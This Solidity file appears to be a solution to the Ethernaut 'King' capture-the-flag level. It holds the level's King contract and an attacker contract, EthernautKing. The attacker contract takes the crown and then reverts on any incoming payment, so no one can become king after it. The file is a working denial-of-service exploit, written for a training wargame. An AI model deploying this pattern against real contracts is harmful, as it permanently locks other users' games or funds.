// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    // console.log('inside King fallback() function');
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract EthernautKing {
  address kingContractAddress;

  constructor(address _kingContractAddress) {
    kingContractAddress = _kingContractAddress;
  }

  function proclamKingForever() external payable returns (bool) {
    require(msg.value > 0, 'value must be greater than 0');
    // console.log('inside proclamKingForever()');
    (bool success, ) = address(kingContractAddress).call{value: msg.value}("");

    return success;
  }

  receive() external payable {
    // console.log('inside EthernautKing receive() function');
    revert("Won't let you be the new King");
  }
}